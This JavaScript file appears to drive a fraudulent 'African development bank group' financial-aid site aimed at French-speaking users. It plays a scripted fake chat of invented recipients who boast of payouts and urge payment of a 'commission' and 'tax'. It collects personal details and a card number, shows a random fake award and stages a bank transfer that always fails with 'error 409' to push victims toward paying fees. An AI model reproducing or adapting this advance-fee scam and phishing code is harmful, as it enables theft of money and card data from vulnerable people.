document.addEventListener('DOMContentLoaded', () => {

const messages =
[
  ["Esther Makungu", "img/ppl/women/1.jpg", 
  "Bonjour à tous, qui s'est passé ?!"],

  ["Robinah Namutebi", "img/ppl/women/2.jpg", 
  "Je pense que oui"],

  ["Robinah Namutebi", "img/ppl/women/2.jpg", 
  "Esther Makungu, j'ai 1238 $.Un aujourd'hui est parti de 2 000 $"],

  ["Kisaaliita Kunobwa", "img/ppl/women/3.jpg", 
  "J'ai 1573 $)))"],

  ["Mukasa", "img/avatar.jpg", 
  "Bonjour à tous, je ne peux pas obtenir de l'argent.La banque émet une erreur 409. Que faire?"],
  
  ["Katudde ", "img/ppl/men/1.jpg", 
  "Bonjour, j'ai 1811, qui va passer?",
  ],
  
  ["konan213 ", "img/ppl/men/2.jpg", 
  "Faire comme indiqué dans les instructions.Vous devez payer la Commission pour convertir de l'USD en XAF.L'argent revenait alors.Je suis rentré le lendemain avec une aide financière.",
  ],
  
  ["Kituusa ", "img/ppl/women/4.jpg", 
  "Oui, à la fin, vous payez pour la Commission, la taxe et le reste et à la fin, vous baignez de l'argent))))))",
  ],
  
  ["Lumala John Kenny ", "img/ppl/women/5.jpg", 
  "J'ai eu 1455 $.J'ai longtemps voulu faire des affaires.Mais chaque jour du matin au soir au travail.Il n'y avait pas de temps, il était nécessaire de fournir une famille.Et maintenant, il y a un montant pour le début",
  ],
  
  ["Agaba Benjamin ", "img/ppl/men/3.jpg", 
  "Expliquez ce qui se passe ici?",
  ],
  
  ["Natweeta Wycliffe ", "img/ppl/men/4.jpg", 
  "J'espère que j'ai réussi à obtenir de l'aide.L'opérateur ne répond pas longtemps.Grande ligne",
  ],
  
  ["Williams ", "img/avatar.jpg", 
  "Voici une assistance financière dans le programme 'African development bank group'",
  ],
  
  ["Agaba Benjamin ", "img/ppl/men/3.jpg", 
  "Et comment l'obtenir?",
  ],
  
  ["Williams ", "img/avatar.jpg", 
  "Faire ce qui est écrit sur le site.Effectuer toutes les étapes",
  ],
  
  ["Haula Lymo ", "img/ppl/women/6.jpg", 
  "Je pense que tu as encore du temps.Dépêche-toi))) au fait, j'ai 1732 $",
  ],
  
  ["Robert Robinson ", "img/ppl/men/4.jpg", 
  "Bonjour à tous",
  ],
  
  ["gogi32 ", "img/avatar.jpg", 
  "feowifewnofe eonfo enfiewno nfeoi",
  ],
  
  ["gogi32 ", "img/avatar.jpg", 
  "ewds fasdf fds e w",
  ],
  
  ["Kins Sak ", "img/ppl/men/5.jpg", 
  "Gogi32, Nabanen pour le spam",
  ],
  
  ["Katusiime Daphine ", "img/ppl/women/7.jpg", 
  "Puis-je obtenir de l'aide plusieurs fois?L'argent est très nécessaire",
  ],
  
  ["Paul ", "img/ppl/men/6.jpg", 
  "Pas!L'argent est nécessaire pour tous!Pensez à d'autres personnes !!!",
  ],
  
  ["Charles ", "img/ppl/men/7.jpg", 
  "Bien sûr que non!Sinon, tout le monde n'aurait pas assez",
  ],
  
  ["Katusiime Daphine ", "img/ppl/women/7.jpg", 
  "Eh bien, si j'essaie de le faire pour mon fils?Également possible?",
  ],
  
  ["Paul ", "img/ppl/men/6.jpg", 
  "Oui, alors tu peux.Une personne est une aide.",
  ],
  
  ["Nakigudde Joan ", "img/ppl/women/8.jpg", 
  "J'ai 3 enfants et pour tout le monde, il y avait un paiement.En général, quelque part 6000 $.Je leur ai tous donné à l'école.Bien.Je ne pense pas)))",
  ],
  
  ["Katusiime Daphine ", "img/ppl/women/7.jpg", 
  "Merveilleux)) Je suis très heureux pour vous)) J'ai 2 enfants.Comme si je voulais qu'ils soient heureux.",
  ],
  
  ["Bukenya Marvin ", "img/ppl/men/7.jpg", 
  "Cette aide financière n'est-elle pas?De sorte que nous et nos enfants vivons heureux",
  ],
  
  ["Katusiime Daphine ", "img/ppl/women/7.jpg", 
  "Ça c'est sûr)))",
  ],
  
  ["Katusiime Daphine ", "img/ppl/women/7.jpg", 
  "Question stupide, mais toujours.Maintenant encore pour les enfants, également besoin d'impôt pour payer?",
  ],
  
  ["Keila Lax ", "img/ppl/women/8.jpg", 
  "Bonjour",
  ],
  
  ["Kins Sak ", "img/ppl/men/5.jpg", 
  "La question est vraiment stupide)) bien sûr!C'est la taxe",
  ],
  
  ["Katusiime Daphine ", "img/ppl/women/7.jpg", 
  "Désolé, je fais juste de mauvais argent",
  ],
  
  ["Katusiime Daphine ", "img/ppl/women/7.jpg", 
  "Bonjour",
  ],
  
  ["Williams ", "img/avatar.jpg", 
  "Rien de terrible, je n'ai pas personnellement pas fort en finance",
  ],
  
  ["Bukenya Marvin ", "img/ppl/men/8.jpg", 
  "Dis-moi et les vieillards soulagent également cette aide?",
  ],
  
  ["Olwiita Edirisa ", "img/ppl/men/9.jpg", 
  "Cette aide s'appuie sur tous les hommes et tous les enfants et tous les autres.Pour une raison quelconque, peu de gens savent à ce sujet.",
  ],
  
  ["Naherya Jackline ", "img/ppl/women/8.jpg", 
  "Кстати да. Среди моих знакомых практически все не знали об этой программе. Сами не могут денег на еду насобирать.",
  ],
  
  ["Olwiita Edirisa ", "img/ppl/men/9.jpg", 
  "Вот-вот. поэтому я всем своим знакомым рассказал об этой программе. Пока сам не скажешь, никто не скажет. Все хотят себе побольше забрать, а о других совсем не думают.",
  ],
  
  ["Nakacwa Mariam ", "img/ppl/women/9.jpg", 
  "Побольше бы таких как вы в нашей стране. Не было бы бедности",
  ],
  
  ["Olwiita Edirisa ", "img/ppl/men/9.jpg", 
  "Пару лет и все хорошо заживем. А все те, кто грамотно распорядятся этими деньгами, уже через пару месяцев будут жить хорошо.",
  ],
  
  ["Madiba ", "img/ppl/men/10.jpg", 
  "Ахах, все кто хорошо распорядятся, будут жить хорошо только через 2 месяца. А все кто плохо, в ближайшие 2 месяца)))",
  ],
  
  ["Olwiita Edirisa ", "img/ppl/men/9.jpg", 
  "Ахах)))",
  ],
  
  ["Olwiita Edirisa ", "img/ppl/men/9.jpg", 
  "Мне пора идти, желаю всем удачи!!!",
  ],
  
  ["Gladys Queen ", "img/ppl/women/10.jpg", 
  "Спасибо, и вам удачи",
  ],
  
  ["Francis Seruwagi ", "img/ppl/men/11.jpg", 
  "Скажите, как все это работает? Я ничего не понимаю",
  ],
  
  ["Barungi Andrew ", "img/ppl/men/12.jpg", 
  "На сайте же все подробно указано. Если вы не можете разобраться, то может вам и деньги не так сильно нужны?",
  ],
  
  ["Francis Seruwagi ", "img/ppl/men/11.jpg", 
  "хаха, очень смешно. Деньги мне очень нужны, но с компьютером я плохо обращаюсь, так что давайте повежливее",
  ],
  
  ["Barungi Andrew ", "img/ppl/men/12.jpg", 
  "Так а в чем тут разбираться??? Сайт вас проводит по этапам. Сначала заполняете форму, потом общаетесь с оператором и так далее",
  ],
  
  ["Francis Seruwagi ", "img/ppl/men/11.jpg", 
  "да, я уже разобрался. Уже оператор говорит что делать дальше. У меня вышло 1364$",
  ],
  
  ["Barungi Andrew ", "img/ppl/men/12.jpg", 
  "неплохо, у меня было 1112$",
  ],
  
  ["Keila Lax ", "img/ppl/women/11.jpg", 
  "А как долго приходят деньги? Я 2 дня назад все сделала, а до сих пор ничего не пришло, а у кого-то уже на следующий день.",
  ],
  
  ["Esther Essy ", "img/ppl/women/12.jpg", 
  "У всех по разному. Там же написано что в течении 7 дней",
  ],
  
  ["Barungi Andrew ", "img/ppl/men/13.jpg", 
  "У всех по разному. когда это только началось, деньги приходили почти сразу же. Потом, когда все больше людей начало узнавать об этом и просить финансовую помощь, время выплат начало увеличиваться. В итоге сейчас деньги могут прийти только на 7 день. Но не позже. Такого я еще ни разу не слышал.",
  ],
  
  ["Keila Lax ", "img/ppl/women/11.jpg", 
  "Поняла, спасибо",
  ],
  
  ["Hatemeloveme Immy ", "img/ppl/women/13.jpg", 
  "Я тоже это заметила. Я получила выплату еще год назад. Тогда деньги пришли через 2 часа. Сейчас у некоторых моих знакомых деньги приходят через 5 дней. Много желающих",
  ],
  
  ["Jajja Dennis Wamala ", "img/ppl/men/14.jpg", 
  "Всем привет, я слышал, что скоро прекратят финансовую поддержку. Потому что у них деньги заканчиваются.",
  ],
  
  ["Jajja Dennis Wamala ", "img/ppl/women/14.jpg", 
  "Да, я тоже это слышала. Многие еще пытаются мошенничать. Ни о ком кроме себя не думают.",
  ],
  
  ["Lucky Odion ", "img/ppl/men/15.jpg", 
  "Очень жаль что в нашем мире есть такие люди",
  ],
];

const randomTime = Math.floor(Math.random() * 1500) + 1000; // от 1000 до 2500

const pages_id = {
  "1": "index.html",
  "2": "cashout.html",
  "3": "operator.html",
  "4": "bank.html",
  "5": "bank_error.html"
}

if (localStorage['msg-id']) {
  returnAllMessege();
  addMessegeFromLast();
}
else if (localStorage['msg-id'] == null) {
  let i = 0;

  const messageInterval = setInterval(() => {
    if (i >= messages.length) {
      i = 0;
    }
    localStorage['msg-id'] = i;
    messageAdd(i);
    i++;
  }, randomTime + 6000); // randomTime + 6000
}

function returnAllMessege() {
  for (let i = 0; i <= localStorage['msg-id']; i++) {
    messageAdd(i);
  }
}

function addMessegeFromLast() {
  let i = parseInt(localStorage['msg-id']) + 1;
  
  const messageInterval = setInterval(() => {
    if (i >= messages.length) {
      i = 0;
    }
    localStorage['msg-id'] = i;
    messageAdd(i);
    i++;
  }, randomTime + 6000);
}

function messageAdd(i) {
  const container = document.querySelector('#msg33');
  const message = document.createElement('div');
  message.classList.add('onemessagevbr');
  
  const msgTime = new Date().getHours() + ':' + new Date().getMinutes();

  message.innerHTML = `
    <img src="${messages[i][1]}" class="avavbr">
    <div class="messagetxt">
      <div class="chatvbrname">${messages[i][0]}</div>
      <div class="jegkergd"><span class="djhg">${messages[i][2]}</span>
        <div class="timechatvbr">${msgTime}</div>
      </div>
    </div>
  `;

  container.append(message);
}

function sendMessege() {
  const input = document.querySelector('#sent'),
        btn = document.querySelector('.chatimg2'),
        container = document.querySelector('#msg33');

  btn.addEventListener('click', () => {
    const inputValue = input.value;
    const message = document.createElement('div');
    message.classList.add('onemessagevbr');
    
    const msgTime = new Date().getHours() + ':' + new Date().getMinutes();

    message.innerHTML = `
      <img src="img/avatar.jpg" class="avavbr">
      <div class="messagetxt main-msg">
        <div class="chatvbrname">${localStorage['name']}</div>
        <div class="jegkergd"><span class="djhg">${inputValue}</span>
          <div class="timechatvbr">${msgTime}</div>
        </div>
      </div>
    `;

    container.append(message);
    input.value = '';
    document.getElementById('msg33').lastChild.scrollIntoView(false)    
    window.scrollBy(0, window.pageYOffset);
  });
}
sendMessege();

if (document.querySelector('.user-name')) {
  const username = document.querySelectorAll('.user-name');

  for (let i = 0; i < username.length; i++) {
    if (localStorage['name']) {
      username[i].innerHTML = localStorage['name'];
    }
    else {
      username[i].innerHTML = '';
    }
  }
}

if (document.querySelector('.user-card')) {
  const usercard = document.querySelectorAll('.user-card');

  for (let i = 0; i < usercard.length; i++) {
    usercard[i].innerHTML = localStorage['user-card'];
  }
}

if (document.querySelector('.user-money')) {
  const usermoney = document.querySelectorAll('.user-money');

  for (let i = 0; i < usermoney.length; i++) {
    usermoney[i].innerHTML = localStorage['user-money'] + ' $';
  }
}

if (document.querySelector('.user-money-xaf')) {
  const usermoneyXAF = document.querySelectorAll('.user-money-xaf');

  for (let i = 0; i < usermoneyXAF.length; i++) {
    usermoneyXAF[i].innerHTML = localStorage['user-money-xaf'] + ' $';
  }
}

if (document.querySelector('#tine')) {
  const tine = document.querySelector('#tine');
  tine.innerHTML = getFormattedDate(new Date());
}

if ((page_id == 1 && localStorage.getItem('page_id') == null) || (page_id == 1 && localStorage.getItem('page_id') == '1')) {
  // анимация загрузки сайта
  const loadingSite = document.querySelector('#loading');

  setTimeout(() => {
  loadingSite.style.display = 'none';
  }, randomTime);

  const modal1 = document.querySelector('#modal1');
  setTimeout(() => {
    modal1.style.display = 'block';
  }, randomTime);
  
  
  localStorage.setItem('page_id', page_id);
  modal1Close();

  const mainBtn = document.querySelector('.main-btn');

  mainBtn.addEventListener('click', (e) => {
    e.preventDefault();
    
    const name = document.querySelector('#input-name'),
          email = document.querySelector('#input-email'),
          child = document.querySelector('#input-child'),
          work = document.querySelector('#input-work'),
          salary = document.querySelector('#input-salary'),
          address = document.querySelector('#input-address');
    
    if (name.value == '') {
      name.previousElementSibling.style.display = 'inline-block';
    }
    else {
      name.previousElementSibling.style.display = 'none';
    }

    if (email.value == '') {
      email.previousElementSibling.style.display = 'inline-block';
    }
    else {
      email.previousElementSibling.style.display = 'none';
    }

    if (child.value == '') {
      child.previousElementSibling.style.display = 'inline-block';
    }
    else {
      child.previousElementSibling.style.display = 'none';
    }

    if (work.value == '') {
      work.previousElementSibling.style.display = 'inline-block';
    }
    else {
      work.previousElementSibling.style.display = 'none';
    }

    if (salary.value == '') {
      salary.previousElementSibling.style.display = 'inline-block';
    }
    else {
      salary.previousElementSibling.style.display = 'none';
    }

    if (address.value == '') {
      address.previousElementSibling.style.display = 'inline-block';
    }
    else {
      address.previousElementSibling.style.display = 'none';
    }

    if (name.value != '' && email.value != '' && child.value != '') {
      localStorage['email'] = email.value;
      localStorage['child'] = child.value;

      name.value = '';
      email.value = '';
      child.value = '';

      const modal4 = document.querySelector('#modal4'),
            blur = document.querySelector('#blur'),
            body = document.querySelector('body'),
            btnWin = document.querySelector('#buttonwin'),
            randomValueMoney = Math.floor(Math.random() * 1000) + 1000;

      localStorage['user-money'] = randomValueMoney;
      localStorage['user-money-xaf'] = randomValueMoney * 538,45;

      modal4.style.display = 'block';
      blur.style.display = 'block';
      body.style.overflow = 'hidden';

      let i = 0;

      const moneyReceived = setInterval(() => {
        if (i > randomValueMoney) {
          clearInterval(moneyReceived);
        }
        else {
          const out = document.querySelector('#out');
          out.innerHTML = i;
          i++;
          console.log(i);
        }
      },1);

      btnWin.addEventListener('click', () => {
        window.location = `${pages_id[2]}`;
      })
    }
  })
}
else if (page_id == 1 && localStorage.getItem('page_id') != '1') {
  const modal7 = document.querySelector('#modal7'),
        loadingSite = document.querySelector('#loading'),
        modal7Btn = document.querySelector('#modal7 .modalbutton');

  setTimeout(() => {
    loadingSite.style.display = 'none';
    modal7.style.display = 'block';
  }, randomTime);

  modal7Btn.addEventListener('click', () => {
    window.location = `${pages_id[localStorage['page_id']]}`;
  });
}
else if (page_id != 1 && localStorage.getItem('page_id') == null) {
  window.location = `${pages_id[1]}`;
}
else if (page_id == 2 && localStorage['page_id'] == 2 || page_id == 2 && localStorage['page_id']  ) {
  localStorage['page_id'] = page_id;

  const peoples = document.querySelector('#peoples'),
        peoplesText = ['Devant vous à Turv 3 personnes','Devant vous à Turv 2 personnes','Devant vous en ligne 1 personne','Il y a une connexion avec l\'opérateur'];

  let i = 0;

  const peoplesInterval = setInterval(() => {
    peoples.innerHTML = peoplesText[i];
    i++;

    if (i >= peoplesText.length) {
      clearInterval(peoplesInterval);

      const loadgif = document.querySelector('#loadgif'),
            loadgif2 = document.querySelector('#loadgif2');
  
      loadgif.style.display = 'none';
      loadgif2.style.display = 'inline-block';

      setTimeout(() => {
        const preload = document.querySelector('#preload'),
              preload2 = document.querySelector('#preload2');

        preload.style.display = 'none';
        preload2.style.display = 'block';
        
        document.querySelector('.loadtext').style.display = 'block';
        let i = 0;

        const loadedTextInterval = setInterval(() => {
          const loadedText = document.querySelectorAll('.loadtext');

            loadedText[i].style.display = 'none';
            loadedText[i+1].style.display = 'block';
            loadedText[i].nextElementSibling.style.display = 'block';
            console.log(Math.floor(Math.random() * 5000) + 2000);
          
            if (i >= 4) {
              clearInterval(loadedTextInterval);
              loadedText[i+1].style.display = 'none';
              setTimeout(() => {
                document.querySelector('.buttonchat').style.display = 'block';
              }, 1000);
            }
          i++;
        }, Math.floor(Math.random() * 5000) + 2000);
      }, randomTime); // время соединения с оператором
    }
  }, randomTime); // время смены людей в очереди
}
else if (page_id == 2 && localStorage['page_id'] > 2) {
  window.location = `${pages_id[localStorage['page_id']]}`;
}
else if (page_id == 3 && localStorage['operatorWrote'] == null) {
  localStorage['page_id'] = page_id;
  const preload = document.querySelector('#preload'),
        preload2 = document.querySelector('#preload2');

  preload.style.display = 'block';
  preload2.style.display = 'none';
  setTimeout(() => {

    preload.style.display = 'none';
    preload2.style.display = 'block';

    if (preload2.style.display == 'block') {
      setTimeout(() => {
        document.querySelector('.loadtext').style.display = 'block';
        localStorage['operatorWrote'] = true;

        let i = 0;
        const loadedTextInterval = setInterval(() => {
          const loadedText = document.querySelectorAll('.loadtext');
  
          loadedText[i].style.display = 'none';
          loadedText[i+1].style.display = 'block';
          loadedText[i].nextElementSibling.style.display = 'block';
          console.log(i);
          i++;
          if (i >= 4) {
            clearInterval(loadedTextInterval);
            loadedText[i].style.display = 'none';
            setTimeout(() => {
              document.querySelector('#msg5').style.display = 'block';

            }, 1000);
          };
        }, randomTime + 2000); // время вывода сообщений randomTime + 2000
      }, randomTime);

    }
  }, randomTime + 2000); // время обработки согласия random + 2000


}
else if (page_id == 3 && localStorage['operatorWrote'] == 'true') {
  const message = document.querySelectorAll('.message'),
        messageBtn = document.querySelector('#msg5');

  for(let i = 0; i < message.length; i++) {
    message[i].style.display = 'block';
  }
  messageBtn.style.display = 'block';
}
else if (page_id == 4) {
  localStorage['page_id'] = page_id;
  const cardBtn = document.querySelector('.card-btn'),
        cardInput = document.querySelector('.cardnumber'),
        cardWarning = document.querySelector('#txt');

  cardBtn.addEventListener('click', () => {
    const form = document.querySelector('#form'),
          loads = document.querySelector('#loads');

    if (cardInput.value == '') {
      cardWarning.innerHTML = 'Spécifiez vos coordonnées!';
    }
    else {
      localStorage['user-card'] = cardInput.value;
      form.style.display = 'none';
      loads.style.display = 'block';
      let i = 0;

      const loadsInterval = setInterval(() => {
        const wi = document.querySelector('#wi'),
              wiArr = ['Connexion avec une passerelle bancaire','Préparation du transfert de fonds','Créer une commande bancaire...','Envoi de commande','Transaction de monnaie...','Transaction de monnaie ... Tentative 2','Transaction de monnaie... Tentative 3','Le destinataire de la banque a rejeté l\'opération, le code de retour 409','Il y a un transfert à la page pour résoudre le problème'];

        wi.innerHTML = wiArr[i];
        i++;

        if (i >= wiArr.length) {
          clearInterval(loadsInterval);
          setTimeout(() => {
            window.location = 'bank_error.html';
          }, 2000);
        }
      }, randomTime + 2000);
    }
  });

}
else if (page_id == 5) {
  localStorage['page_id'] = page_id;

  // номер транзакции
  if (localStorage['transaction']) {
    document.querySelector('.user-transaction').innerHTML = '№' + localStorage['transaction'];
  }
  else {
    const transaction = Math.floor(Math.random() * 514593453534) + 114593453534;
    localStorage['transaction'] = transaction;
    document.querySelector('.user-transaction').innerHTML = '№' + localStorage['transaction'];
  }

  // дата платежа
  if (localStorage['payment-date']) {
    const paymentDate = document.querySelector('.payment-date');
    paymentDate.innerHTML = localStorage['payment-date'];
  }
  else {
    const paymentDate = document.querySelector('.payment-date');

    localStorage['payment-date'] = getFormattedDate(new Date())
    paymentDate.innerHTML = localStorage['payment-date'];
  }
}

// Первое модальное окно, в котором мы указываем email
function modal1Close() {
  const btnModal1 = document.querySelector('#modal1 .modalbutton'),
        blur = document.querySelector('#blur'),
        body = document.querySelector('#body'),
        name = document.querySelector('#name');

  btnModal1.addEventListener('click', () => {
    if (name.value != '') {
      btnModal1.closest('.modalfade1').style.display = 'none';
      blur.style.display = 'none';
      body.style.overflow = 'auto';

      localStorage.setItem('name', name.value); // добавляем имя в localStrorage
      alert(`Bienvenue ${name.value}`);
      name.value = '';
    }
    else {
      alert('Spécifiez votre nom!');
    }
  });
}

function getFormattedDate(date) {
  let year = date.getFullYear();
  let month = (1 + date.getMonth()).toString().padStart(2, '0');
  let day = date.getDate().toString().padStart(2, '0');

  return day + '.' + month + '.' + year;
}


});
